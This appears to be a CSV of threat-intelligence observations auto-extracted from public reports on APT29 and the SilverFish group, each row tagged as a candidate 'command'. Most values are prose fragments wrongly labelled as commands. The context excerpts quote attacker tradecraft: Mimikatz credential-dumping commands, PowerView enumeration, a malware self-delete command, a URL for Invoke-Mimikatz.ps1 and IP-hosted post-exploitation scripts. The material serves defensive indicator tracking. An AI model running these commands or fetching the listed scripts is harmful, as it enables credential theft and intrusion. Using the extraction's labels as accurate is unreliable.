schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:6647ce9779153b52567ff9ac7b1a8d10cc937367e9f904277abec9fe62221fdd,observation--sha256:54d2910ef753d31c3b1031902e77e45bdc61d24edde71b713f0867899d37df6b,command,The recognition continues to obtain the version of Powershell installed,The recognition continues to obtain the version of Powershell installed,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:a4d9aae394f5965fdce8abe50ec5387efe4e559e93787a843087ad8894582e7f,observation--sha256:fdcba2df1a91d4c5d5024fb574f777ce71ee88c415b062534910cfdc9e81120f,command,and encoded Powershell commands. The decoded and decompressed Powershell,and encoded Powershell commands. The decoded and decompressed Powershell,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:1ef70a65c70a94ccf1335c88ca183d520e0d3e2c3f2d2a33fc96cf831802621b,observation--sha256:f177be819a0da58d929569aac0599a30baddd3267e41e38ebce20367d36abd1e,command,"arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of","arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:efe192cd92931ed897dd4e90d9a595c2e1a0e2024f7209e7733cd350d992b405,observation--sha256:811a4ced46869134f9b32542a48e73dc962ec74a94e93e2a26f9020244814de8,command,came across another Powershell stub that decodes another BASE64 encoded payload using,came across another Powershell stub that decodes another BASE64 encoded payload using,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:2f51111ad5e2b9ed50d0a043b66f03ac695723b264802b053c46c2d9da806584,observation--sha256:f2a3dfbc63f7be30b26063514972c2fa77a6e38fdf74c81e7c8f2210232442ad,command,"cases PowerSploit and Mimikatz post exploitation Powershell scripts. Additionally, there are","cases PowerSploit and Mimikatz post exploitation Powershell scripts. Additionally, there are",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 20}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Depending on the analysis made on the TDS panel, the PTI Team believes that the traffic distribution is achieved by injecting the following malicious PHP and JavaScript codes into multiple legitimate websites. Injected code checks the host, referrer, and cookie headers for the expected values on every incoming request and sends an HTTP GET request to the hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate ?phpcid=250&php address by appending the &hn=%URL-ENCOD",
1.0.0,actor--apt29,artifact--sha256:d0bcb236854daf7a6bf744d721b36925398f3b7c8dee43a4c9b0d9c99ebf76b0,observation--sha256:d1f9e5fb2831ed8f1364a35873e24910baec94b3bb1c27a8affef5b40a47d8bc,command,client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts.,client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:419c4f796e964254425675822daead5dae302453ccde5e74c46f401732133cbe,observation--sha256:1348c94cfc54cebf2f7cc58f39e7e8f61e1e0a33af5c5bce7d0f0a5a5e2458e7,command,<command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 100}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5299 If Subkey 6 does not exist, the function returns a default value with the following fields: <iteration> : Value between 5 and 20 (depending on each sample) <id> : 0 <command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30 & del /F “%PROCESSOR_IDENTIFIER%” <EnvironmentVariableExpanded> : $(PROCESSOR_IDENTIFIER) <EnvironmentVariable> : PROCESSOR_IDENTFIER This command returns the Accept and User-Agent headers in the result. 3.4.3.4 GET HEADERS Illustration 94. GET HEAD",
1.0.0,actor--apt29,artifact--sha256:08325be1057566e743407a5dbf52a0398b180f7100170dd6ef4b3f0294a792fe,observation--sha256:f430a5990c67a06035c9740a34e7ae914b6c2c7eb8d0564cd8ce8775208c1ec5,command,commands contains another Powershell loader script. The second stage script extracts the,commands contains another Powershell loader script. The second stage script extracts the,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:405eb50be3d00b7a0114a1962bee87d518eef566e36cf939dddfe77bd7845b71,observation--sha256:346816356774ee929bc26c20c71722a84bf1432acfa3ff408290a5fec6919856,command,"compressed Powershell commands. After de-obfuscating the Empire agent loader, the PTI","compressed Powershell commands. After de-obfuscating the Empire agent loader, the PTI",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 27}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group The PTI Team was able to analyze one of the Empire agents used by the SilverFish group. As with Cobalt Strike beacons, Empire agent loaders are executed with encoded and compressed Powershell commands. After de-obfuscating the Empire agent loader, the PTI Team extracted the https://149 .154.157 .248:443C&C address. Figure 30. Decoded Empire agent code 3.4 VictimTotal Sandbox One of the most shocking discoveries of the PTI Team was a web panel for testing the malici",
1.0.0,actor--apt29,artifact--sha256:f417e23ef3f2fdccac444552b08cf8e32beadbe83f931933a986f6813c08a50d,observation--sha256:6ce86067f8815b7eb55e56071a708499745b2fedeb3663fd6b610293ac5d83f9,command,description: Service or Drive enumeration via powershell,description: Service or Drive enumeration via powershell,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 16 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'pass' - 'connect' condition: selection falsepositives: legitimate use of rsockstun or software with exact same arguments title: Service or Drive enumeration via powershell description: Service or Drive enumeration via powershell author: references: date: 2023/11/15 logsource: category: ps_script product: wind,
1.0.0,actor--apt29,artifact--sha256:dc2412b4d75233658b279d291b14ad1937f5eccf969c8a1f1f4e9b947c28e859,observation--sha256:6025ae14bf0e4a79860095375bbf6df23fd915699c175f5e0bec028784c8e59a,command,encoded PowerShell.,encoded PowerShell,candidate,,unknown,unknown,not-stated,,source--apt29--186bc843f9cfc077,APT29/AA21-116A_Russian_Foreign_Intelligence_Service_Cyber_Operations_508C.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | DHS | CISA TLP:WHITE Page 4 of 5 | Product ID: AA21-116A TLP: WHITE 19 vaccine development. The FBI’s investigation revealed that following initial compromise of a network—normally through an unpatched, publicly -known vulnerability—the actors deployed WELLMESS. Once on the network, the actors targeted each organization’s vaccine research repository and Active Directory servers. These intrusions, which mostly relied on targeting on- premises network resources, were a departure from histori",
1.0.0,actor--apt29,artifact--sha256:5827893e9ad7b3f19516b4b7920e090ea48d189221ecbffb25def38083f89f6c,observation--sha256:4c20fb5a3110de1f88f9a236bafdda7cb7fdf1b03badd01b0294952d77c80a41,command,encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire,encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:47e40db4db2f826f515c08271efbbbca67c45fcfd4f159aced685357c8bc6d06,observation--sha256:52b887f7ab2bad286fdbf3e7c28861b051aa5576992c29949cf80a3e432a4664,command,"lots of specially crafted Powershell, BAT , CSPROJ, JavaScript and HTA files that are mainly","lots of specially crafted Powershell, BAT , CSPROJ, JavaScript and HTA files that are mainly",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 20}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Depending on the analysis made on the TDS panel, the PTI Team believes that the traffic distribution is achieved by injecting the following malicious PHP and JavaScript codes into multiple legitimate websites. Injected code checks the host, referrer, and cookie headers for the expected values on every incoming request and sends an HTTP GET request to the hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate ?phpcid=250&php address by appending the &hn=%URL-ENCOD",
1.0.0,actor--apt29,artifact--sha256:064abab2144db9fcef348a77430a2d5582a0e0135c08d970467a35a547b0b00c,observation--sha256:8d6f1a4ace4f53a10b1dc55a736135172e771f11def64cbed0e5b36039912213,command,raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1,raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:1cbe4cbcafcb265881ea469dd5debc1064b026b0ed8ea56714bf70f911adb815,observation--sha256:bf6661b9ea1a70e3e4bec4885430e5590a3c6a5032143e24ac999a6dba71f112,command,"returned, powershell required + console shown. if failed, needs manual reg cleanup","returned, powershell required + console shown. if failed, needs manual reg cleanup",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 13}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Spawn new shell session (port 143) Spawn new shell session (port 443) (+amsi.dll patch WIN10 ONLY) Spawn new shell session (port 443) (+amsiInitFailed=true WIN10 ONLY) TEST Spawn new bot instance Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required + console shown. Blocked by WD Spawn new bot instance elevated (eventvwr, WIN7, WIN8.1) Spawn new bot instance elevated (sdclt, build>=14393, WIN10) WD alert, instance dies, still works ",
1.0.0,actor--apt29,artifact--sha256:27be3fc5a3e1bbfc0597e0dfc3422237b719356a88c70f97d7aaa0d8f4f428f3,observation--sha256:e21e8d3c3d5a29b7045233738bcb296aae56e400f1b439d256272f1d1b905416,command,rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
